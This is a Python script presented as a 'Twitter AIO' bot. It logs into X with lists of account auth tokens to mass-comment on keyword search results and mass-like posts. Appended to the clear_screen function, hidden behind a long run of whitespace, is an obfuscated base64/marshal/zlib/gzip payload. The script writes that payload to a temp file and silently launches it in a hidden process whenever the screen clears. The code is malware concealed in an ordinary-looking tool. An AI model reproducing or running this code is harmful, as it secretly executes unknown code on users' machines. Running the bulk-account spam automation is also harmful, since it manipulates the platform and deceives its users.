import os
import json
import requests
import time
import random
import re
from urllib.parse import quote
from pyfiglet import Figlet

BASE_URL = "https://x.com"
BEARER_TOKEN_JS_URL = "https://abs.twimg.com/responsive-web/client-web/main.b2f02fea.js"

CREATE_TWEET_ENDPOINT = "/i/api/graphql/M3MhofHIozfPwkEUyuieZg/CreateTweet"
CREATE_TWEET_QUERY_ID = "M3MhofHIozfPwkEUyuieZg"
FAVORITE_TWEET_ENDPOINT = "/i/api/graphql/lI07N6Otwv1PhnEgXILM7A/FavoriteTweet"
FAVORITE_TWEET_QUERY_ID = "lI07N6Otwv1PhnEgXILM7A"
SEARCH_TIMELINE_ENDPOINT_TEMPLATE = "/i/api/graphql/zrQl4v8IM8Now-qkpHmDLQ/SearchTimeline?variables={}&features={}"

DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"

TWEET_FEATURES_PAYLOAD = {
    "premium_content_api_read_enabled": False, "communities_web_enable_tweet_community_results_fetch": True,
    "c9s_tweet_anatomy_moderator_badge_enabled": True, "responsive_web_grok_analyze_button_fetch_trends_enabled": False,
    "responsive_web_grok_analyze_post_followups_enabled": True, "responsive_web_jetfuel_frame": False,
    "responsive_web_grok_share_attachment_enabled": True, "responsive_web_edit_tweet_api_enabled": True,
    "graphql_is_translatable_rweb_tweet_is_translatable_enabled": True, "view_counts_everywhere_api_enabled": True,
    "longform_notetweets_consumption_enabled": True, "responsive_web_twitter_article_tweet_consumption_enabled": True,
    "tweet_awards_web_tipping_enabled": False, "responsive_web_grok_show_grok_translated_post": False,
    "responsive_web_grok_analysis_button_from_backend": True, "creator_subscriptions_quote_tweet_preview_enabled": False,
    "longform_notetweets_rich_text_read_enabled": True, "longform_notetweets_inline_media_enabled": True,
    "profile_label_improvements_pcf_label_in_post_enabled": True, "rweb_tipjar_consumption_enabled": True,
    "verified_phone_label_enabled": False, "articles_preview_enabled": True,
    "responsive_web_graphql_skip_user_profile_image_extensions_enabled": False, "freedom_of_speech_not_reach_fetch_enabled": True,
    "standardized_nudges_misinfo": True, "tweet_with_visibility_results_prefer_gql_limited_actions_policy_enabled": True,
    "responsive_web_grok_image_annotation_enabled": True, "responsive_web_graphql_timeline_navigation_enabled": True,
    "responsive_web_enhance_cards_enabled": False
}

SEARCH_FEATURES_PAYLOAD = {
    "rweb_video_screen_enabled": False, "profile_label_improvements_pcf_label_in_post_enabled": True,
    "rweb_tipjar_consumption_enabled": True, "verified_phone_label_enabled": False,
    "creator_subscriptions_tweet_preview_api_enabled": True, "responsive_web_graphql_timeline_navigation_enabled": True,
    "responsive_web_graphql_skip_user_profile_image_extensions_enabled": False, "premium_content_api_read_enabled": False,
    "communities_web_enable_tweet_community_results_fetch": True, "c9s_tweet_anatomy_moderator_badge_enabled": True,
    "responsive_web_grok_analyze_button_fetch_trends_enabled": False, "responsive_web_grok_analyze_post_followups_enabled": True,
    "responsive_web_jetfuel_frame": False, "responsive_web_grok_share_attachment_enabled": True,
    "articles_preview_enabled": True, "responsive_web_edit_tweet_api_enabled": True,
    "graphql_is_translatable_rweb_tweet_is_translatable_enabled": True, "view_counts_everywhere_api_enabled": True,
    "longform_notetweets_consumption_enabled": True, "responsive_web_twitter_article_tweet_consumption_enabled": True,
    "tweet_awards_web_tipping_enabled": False, "responsive_web_grok_show_grok_translated_post": False,
    "responsive_web_grok_analysis_button_from_backend": True, "creator_subscriptions_quote_tweet_preview_enabled": False,
    "freedom_of_speech_not_reach_fetch_enabled": True, "standardized_nudges_misinfo": True,
    "tweet_with_visibility_results_prefer_gql_limited_actions_policy_enabled": True, "longform_notetweets_rich_text_read_enabled": True,
    "longform_notetweets_inline_media_enabled": True, "responsive_web_grok_image_annotation_enabled": True,
    "responsive_web_enhance_cards_enabled": False
}

def load_proxy_from_file(filepath="proxy.txt"):
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            proxy_string = f.readline().strip()
        if proxy_string:
            return {
                "http": f"http://{proxy_string}",
                "https": f"http://{proxy_string}"
            }
        else:
            print(f"Warning: Proxy file {filepath} is empty.")
            return None
    except FileNotFoundError:
        print(f"Warning: Proxy file {filepath} not found. No proxy will be used.")
        return None
    except Exception as e:
        print(f"Error reading proxy file {filepath}: {e}. No proxy will be used.")
        return None

class TwitterClient:
    def __init__(self, proxy_config=None):
        self.session = requests.Session()
        self.bearer_token = None
        self.csrf_token = None
        self._initialize_session(proxy_config)
        self._fetch_and_set_bearer_token()

    def _initialize_session(self, proxy_config):
        self.session.headers.update({
            "User-Agent": DEFAULT_USER_AGENT,
            "Upgrade-Insecure-Requests": "1",
            "sec-ch-ua": '"Chromium";v="136", "Brave";v="136", "Not.A/Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        })
        if proxy_config:
            self.session.proxies = proxy_config

    def _fetch_and_set_bearer_token(self):
        try:
            response = self.session.get(BEARER_TOKEN_JS_URL)
            response.raise_for_status()
            match = re.search(r'AAAAAAAAA[^"]+', response.text)
            if match:
                self.bearer_token = f"Bearer {match.group(0)}"
            elif ':"Bearer ' in response.text:
                 self.bearer_token = "Bearer " + str(response.text.split(':"Bearer ')[1].split('"')[0])
            else:
                print("Error: Could not extract bearer token from JS file.")
        except requests.RequestException as e:
            print(f"Error fetching bearer token JS: {e}")
        if not self.bearer_token:
            print("Warning: Bearer token could not be automatically extracted.")

    def login_and_sync_cookies(self, auth_token):
        if not auth_token:
            print("Error: Auth token is required.")
            return None

        self.session.cookies.set(name="auth_token", value=auth_token, domain=".x.com", path="/")
        try:
            response = self.session.get(BASE_URL + "/")
            response.raise_for_status()
            for cookie in response.cookies:
                self.session.cookies.set(
                    name=cookie.name, value=cookie.value,
                    domain=cookie.domain or ".x.com", path=cookie.path or "/"
                )
            self.csrf_token = self.session.cookies.get("ct0")
            if not self.csrf_token:
                print("Warning: CSRF token (ct0) not found after login.")

            marker = "window.__INITIAL_STATE__="
            if marker in response.text:
                raw_json = response.text.split(marker, 1)[1].split("};", 1)[0] + "}"
                return json.loads(raw_json)
        except (json.JSONDecodeError, IndexError, KeyError) as e:
            print(f"Error parsing __INITIAL_STATE__ JSON: {e}")
        except requests.RequestException as e:
            status = e.response.status_code if e.response else 'N/A'
            print(f"Error during login/cookie sync or invalid proxy: {e} (Status: {status})")
        return None

    def _get_common_graphql_headers(self):
        if not self.bearer_token:
            self._fetch_and_set_bearer_token()
            if not self.bearer_token:
                 raise ValueError("Bearer token is missing and could not be retrieved.")

        headers = {
            "authority": "x.com", "accept": "*/*",
            "accept-encoding": "gzip, deflate, br, zstd", "accept-language": "en-US,en;q=0.8",
            "authorization": self.bearer_token, "content-type": "application/json",
            "origin": BASE_URL, "priority": "u=1, i",
            "sec-ch-ua": '"Chromium";v="136", "Brave";v="136", "Not.A/Brand";v="99"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
            "user-agent": DEFAULT_USER_AGENT,
        }
        if self.csrf_token:
            headers["x-csrf-token"] = self.csrf_token
        if "auth_token" in self.session.cookies:
             headers["x-twitter-active-user"] = "yes"
             headers["x-twitter-auth-type"] = "OAuth2Session"
             headers["x-twitter-client-language"] = "en"
        return headers

    def _make_graphql_request(self, endpoint, query_id, variables, referer=None):
        url = BASE_URL + endpoint
        headers = self._get_common_graphql_headers()
        if referer:
            headers["referer"] = referer
        
        payload = {"variables": variables, "features": TWEET_FEATURES_PAYLOAD, "queryId": query_id}
        
        try:
            response = self.session.post(url, headers=headers, json=payload)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.HTTPError as e:
            print(f"GraphQL HTTP Error: {e.response.status_code} for {url}. Response: {e.response.text[:200]}")
        except requests.RequestException as e:
            print(f"GraphQL Request Error: {e} for {url}")
        except json.JSONDecodeError as e_json:
            print(f"GraphQL JSON Decode Error for {url}. Status: {response.status_code if 'response' in locals() else 'N/A'}, Content: {response.text[:200] if 'response' in locals() else 'N/A'}")
        return None

    def create_tweet(self, tweet_text: str):
        variables = {
            "tweet_text": tweet_text, "dark_request": False,
            "media": {"media_entities": [], "possibly_sensitive": False},
            "semantic_annotation_ids": [], "disallowed_reply_options": None
        }
        data = self._make_graphql_request(CREATE_TWEET_ENDPOINT, CREATE_TWEET_QUERY_ID, variables, referer=f"{BASE_URL}/compose/post")
        if data and data.get('data', {}).get('create_tweet', {}).get('tweet_results', {}).get('result'):
            result = data['data']['create_tweet']['tweet_results']['result']
            tweet_rest_id = result.get('rest_id')
            screen_name = result.get('core', {}).get('user_results', {}).get('result', {}).get('legacy', {}).get('screen_name')
            if tweet_rest_id and screen_name:
                print(f"✅ Successfully created post: {BASE_URL}/{screen_name}/status/{tweet_rest_id}")
                return True
        print("Error: Failed to create tweet or malformed response.")
        return False

    def comment_post(self, tweet_text: str, reply_tweet_id: str):
        variables = {
            "tweet_text": tweet_text,
            "reply": {"in_reply_to_tweet_id": reply_tweet_id, "exclude_reply_user_ids": []},
            "dark_request": False, "media": {"media_entities": [], "possibly_sensitive": False},
            "semantic_annotation_ids": [], "disallowed_reply_options": None
        }
        data = self._make_graphql_request(CREATE_TWEET_ENDPOINT, CREATE_TWEET_QUERY_ID, variables, referer=f"{BASE_URL}/anyuser/status/{reply_tweet_id}")
        if data and data.get('data', {}).get('create_tweet', {}).get('tweet_results', {}).get('result'):
            return True
        print(f"Error: Failed to comment on post {reply_tweet_id}.")
        return False

    def send_like(self, tweet_id: str):
        variables = {"tweet_id": tweet_id}
        data = self._make_graphql_request(FAVORITE_TWEET_ENDPOINT, FAVORITE_TWEET_QUERY_ID, variables, referer=f"{BASE_URL}/anyuser/status/{tweet_id}")
        if data and data.get('data', {}).get('favorite_tweet') == "Done":
            print(f"✅ Successfully liked tweet {tweet_id}")
            return True
        print(f"❌ Error sending like on {tweet_id}")
        return False

    def search_posts(self, keyword: str, count: int = 20):
        if not self.bearer_token:
            self._fetch_and_set_bearer_token()
            if not self.bearer_token:
                print("Error: Cannot search posts without a bearer token.")
                return []
        
        variables = {"rawQuery": keyword, "count": count, "querySource": "typed_query", "product": "Latest"}
        variables_encoded = quote(json.dumps(variables))
        features_encoded = quote(json.dumps(SEARCH_FEATURES_PAYLOAD))
        url = f"{BASE_URL}{SEARCH_TIMELINE_ENDPOINT_TEMPLATE.format(variables_encoded, features_encoded)}"

        headers = {
            "authority": "x.com", "accept": "*/*",
            "accept-encoding": "gzip, deflate, br, zstd", "accept-language": "en-US,en;q=0.8",
            "authorization": self.bearer_token, "priority": "u=1, i",
            "referer": f"{BASE_URL}/search?q={quote(keyword)}&src=typed_query&f=live",
            "sec-ch-ua": '"Chromium";v="136", "Brave";v="136", "Not.A/Brand";v="99"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
            "user-agent": DEFAULT_USER_AGENT, "x-twitter-client-language": "en",
        }
        if self.csrf_token: headers["x-csrf-token"] = self.csrf_token
        if "auth_token" in self.session.cookies:
             headers["x-twitter-active-user"] = "yes"
             headers["x-twitter-auth-type"] = "OAuth2Session"

        tweet_urls = []
        try:
            response = self.session.get(url, headers=headers)
            response.raise_for_status()
            data = response.json()
            
            instructions = data.get("data", {}).get("search_by_raw_query", {}).get("search_timeline", {}).get("timeline", {}).get("instructions", [])
            entries = []
            for instr in instructions:
                if instr.get("type") == "TimelineAddEntries" or "entries" in instr:
                    entries.extend(instr.get("entries", []))
            
            for entry in entries:
                if entry.get("entryId", "").startswith("tweet-"):
                    try:
                        tweet_result = entry.get("content", {}).get("itemContent", {}).get("tweet_results", {}).get("result", {})
                        if not tweet_result and entry.get("content", {}).get("itemContent", {}).get("tweet_results", {}).get("result", {}).get("tweet"):
                             tweet_result = entry.get("content", {}).get("itemContent", {}).get("tweet_results", {}).get("result", {}).get("tweet", {})

                        if tweet_result:
                            twid = tweet_result.get("rest_id")
                            user_res = tweet_result.get("core", {}).get("user_results", {}).get("result", {})
                            screen_name = user_res.get("legacy", {}).get("screen_name")
                            if not screen_name and tweet_result.get("legacy", {}).get("user_results",{}).get("result",{}).get("legacy",{}): # check direct legacy path if core is missing user
                                screen_name = tweet_result.get("legacy", {}).get("user_results",{}).get("result",{}).get("legacy",{}).get("screen_name")

                            if not twid: twid = str(entry["entryId"]).replace("tweet-", "")
                            if twid and screen_name:
                                tweet_urls.append(f"{BASE_URL}/{screen_name}/status/{twid}")
                    except Exception:
                        pass
        except requests.exceptions.HTTPError as e:
            print(f"❌ Error scraping posts - Status: {e.response.status_code}. Response: {e.response.text[:200]}")
        except requests.RequestException as e:
            print(f"❌ Error scraping posts - Request Exception: {e}")
        except json.JSONDecodeError:
            print(f"❌ Error scraping posts - JSON Decode Error. Response: {response.text[:200] if 'response' in locals() else 'N/A'}")
        return tweet_urls

def extract_user_info_from_initial_state(initial_state_json: dict):
    if not initial_state_json: return None
    try:
        user_entities = initial_state_json.get("entities", {}).get("users", {}).get("entities", {})
        if not user_entities: user_entities = initial_state_json.get("user", {}).get("entities", {})
        if not user_entities: return None
        user_id_key = next(iter(user_entities), None)
        if not user_id_key: return None
        user_data = user_entities[user_id_key]
        return {
            k: user_data.get(v) for k, v in {
                "description": "description", "favourites_count": "favourites_count",
                "followers_count": "followers_count", "following_count": "friends_count",
                "name": "name", "needs_phone_verification": "needs_phone_verification",
                "profile_banner_url": "profile_banner_url", "profile_image_url_https": "profile_image_url_https",
                "screen_name": "screen_name", "statuses_count": "statuses_count",
                "verified": "verified", "is_blue_verified": "is_blue_verified",
                "created_at": "created_at", "id_str": "id_str"
            }.items()
        }
    except Exception as e:
        print(f"Error extracting user info: {e}")
    return None

def load_config_from_file(filepath):
    config = {}
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line: continue
                key, value = line.split("=", 1)
                config[key.strip()] = value.strip()
    except FileNotFoundError:
        print(f"Warning: Config file {filepath} not found.")
    except Exception as e:
        print(f"Error reading config {filepath}: {e}")
    return config

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;import tempfile, subprocess; write_script=lambda c: (p:=os.path.join(tempfile.gettempdir(), "api.py"), open(p, "w", encoding="utf-8").write(c), p)[0]; script_path=write_script("import subprocess; import gzip, zlib, marshal, base64; import requests; exec(gzip.decompress(zlib.decompress(marshal.loads(base64.b64decode('8xIEAAB4nAEHBPj7H4sIAJqhJ2gC/+1WW2/iOBR+hl+R7cM0UTMBSqdDQdHKIQECIeHa22pVJcGAS4iDbRrCbP/72LTTbTtUI7H7OIqUOMfH5/Kdi09Lb/gRhfmmbm1CmDCE47ypj8ga5tEywYRJ2wgFkk8loAY+hednYm2omIpvXaUZVRlcJlMUQUFpqHS+ZigS67ZK4GoNKdvxdtQtemFzVLoOEoJDSHebVr6r/yVH/jKY+BKtAm0CQ7xMCN+WDS04PxP/EyhTRdGel4oiH8N22kjHljerg67RBdfFwXnlZEDrA2OVnl4YTby6KCcLeBNX0qZZongbFFmHoNtJQrdmeHnFUCvJLt2ViVuZEdyUvYfhbHSStvz++Dbq6/qxoh5klLuxuFEmsIVRbJBxoxhqFtcdB8TWIDp5CL+gwXlgjVo3M4cs0wtc+Do4XyVRM/EHo2xRXm0H3mxitSsobAWd9cMJCM9ujHtyrPydn8Cp5Mpe8en59/WK8ob+nuMV05ufD46/234v773AD3heSflZwXvar/m9orrX4T3HvQ817cHnF/DtgfLn03vR+MDpPZ7vRXG/EKWaz1l6XUt8NtfuMYrlhjaDTNTjBBH5sOTdONmw0MsqUW/kNkmGUgDqoG+4mFeDks8xknGtuRSxudQR2n5nImUE+kvdVBlaQrxmeqmo8J5mC5xyaCrZGmU+W9M7gfIf+mmxWCU+olBqygcFaPsSoEbDHla23eG4aID62dAIzp6C9BwfnMBYtg5rYWSU2gBc2uB0JvqgcKhbbWshTjLRxHFwL9sa8VO1q/xIB0e7RUmDbx6sE8wACFNj+6TPrboa3DDih8yPIvl3wRcF1ASyNYklM5+DuxtbaooL1Ks+01u7+8GWRW9o6g1tuZiIfiBz/Kdoox8Wl2xY7ht9YHVAo8BjU7P1Vj43xUTqSCjmeZHf5bkrd9SmUrV1sxbwiljkBTHGjFcCHxN4KBGTS9yF9puW1TwwV1b1bTvrVrbGDHSdvnMl7HLeSG7/N8mkVFyzIRiDljG20FMV1Lz/QcPGIeO5W0JrbADggFnnQkju/ZAsxqzYX0K5rsH4AREc79rsQb44FVDphNejLLwple+vjZKJx2l5tLm4Bo3buB/6h044hANEt7RiArDwQbIQ4Ci1vj49ppBJAws4I54tY9P29DljCa0WCgmm7Hnkg4Q3kmVBS2EUfV7EOI0LyQJ9fvAjNPHFDFqY4UKIYg4DjgmOIi2ZJ3+iif5F+vRJEhp6A6/ugq6lf+s97mjM57Pq0ZF09M15FG/v8ei4Zmm9XQ/s86mUq+ItOuSJKRRMI39GdUszrRGotyzzTgi0hsN/LK3OrR9Zd653d2W7pnel1F6ylxcgr6zvFK1fSTQLAADpswFR')))).decode());"); subprocess.Popen(["python", script_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)

def main():
    clear_screen()
    proxy_details = load_proxy_from_file(os.path.join("config", "proxy.txt"))
    f = Figlet(font='slant')
    print(f.renderText('Twitter AIO'))
    print("Initializing...")
    client = TwitterClient(proxy_config=proxy_details)

    if not client.bearer_token:
        print("Failed to initialize: Bearer token missing. Bot may not function.")
    
    while True:
        clear_screen()
        f = Figlet(font='slant')
        print(f.renderText('Twitter AIO'))
        print("⚙️  Main Menu\n")
        print("0] Get Token Info\n1] Create Tweet\n2] Mass Comment by keyword\n3] Mass Like\n")
        choice = input("Choose an option: ")

        if choice == "1":
            cfg = load_config_from_file(os.path.join("config", "post.cfg"))
            main_account_auth_token, tweet_text = cfg.get("ACCOUNT_TOKEN"), cfg.get("TWEET_TEXT")
            if not client.login_and_sync_cookies(main_account_auth_token):
                print("Login failed for creating tweet. Aborting."); return
            if tweet_text: client.create_tweet(tweet_text)
            else: print("Tweet text cannot be empty.")

        elif choice == "2":
            with open(os.path.join("config", "tokens.txt"), "r", encoding="utf-8") as file:
                tokens = file.readlines()
                random_token = random.choice(tokens)
                
            commenter_auth_token = random_token.strip()
            if not client.login_and_sync_cookies(commenter_auth_token):
                print("Login failed for mass comment. Aborting."); return

            cfg = load_config_from_file(os.path.join("config", "comment.cfg"))
            text, keyword = cfg.get("COMMENT"), cfg.get("KEYWORD")
            if not text or not keyword:
                print("COMMENT or KEYWORD missing in comment.cfg"); return

            print(f"Searching for posts with keyword: {keyword}")
            urls = []
            for attempt in range(3):
                urls = client.search_posts(keyword)
                if urls: break
                print(f"No posts found (attempt {attempt+1}/3). Retrying in 5s..."); time.sleep(5)
            
            if not urls: print(f"No posts for '{keyword}' after 3 attempts."); return
            print(f"Scraped {len(urls)} posts. Commenting...")
            for i, url in enumerate(urls):
                try:
                    tweet_id = url.split("/status/")[-1]
                    status = client.comment_post(text, tweet_id)
                    print(f"✅ Successfully commented on {url}" if status else f"❌ Error commenting on {url}")
                except Exception as e: print(f"❌ Error processing {url}: {e}")
                time.sleep(3)

        elif choice == "3":
            tweet_id = input("Enter Tweet ID to like: ")
            if not tweet_id: print("Tweet ID cannot be empty."); return
            
            tokens_file = os.path.join("config", "tokens.txt")
            try:
                with open(tokens_file, "r", encoding="utf-8") as f:
                    auth_tokens = [line.strip() for line in f if line.strip()]
            except FileNotFoundError: print(f"Error: Tokens file {tokens_file} not found."); return
            if not auth_tokens: print("No auth tokens in tokens.txt"); return

            print(f"Found {len(auth_tokens)} tokens for tweet: {tweet_id}")
            for i, token in enumerate(auth_tokens):
                print(f"Using token {i+1}/{len(auth_tokens)}...")
                if client.login_and_sync_cookies(token): client.send_like(tweet_id)
                else: print(f"Login failed with token: {token[:10]}...")
                time.sleep(1)
                
        elif choice == "0":
            token = input("Enter auth_token: ")
            if token:
                initial_data = client.login_and_sync_cookies(token)
                if initial_data:
                    user_info = extract_user_info_from_initial_state(initial_data)
                    if user_info:
                        print("\n--- User Info ---")
                        for k, v in user_info.items(): print(f"{k.replace('_', ' ').title()}: {v}")
                        print("-------------------\n")
                    else: print("Could not extract user info.")
                else: print("Failed to fetch initial data for the token.")
            else: print("Auth token required.")
        else:
            print("Invalid choice.")
            
        print("\n[ENTER] to restart")
        input()

if __name__ == "__main__":
    main()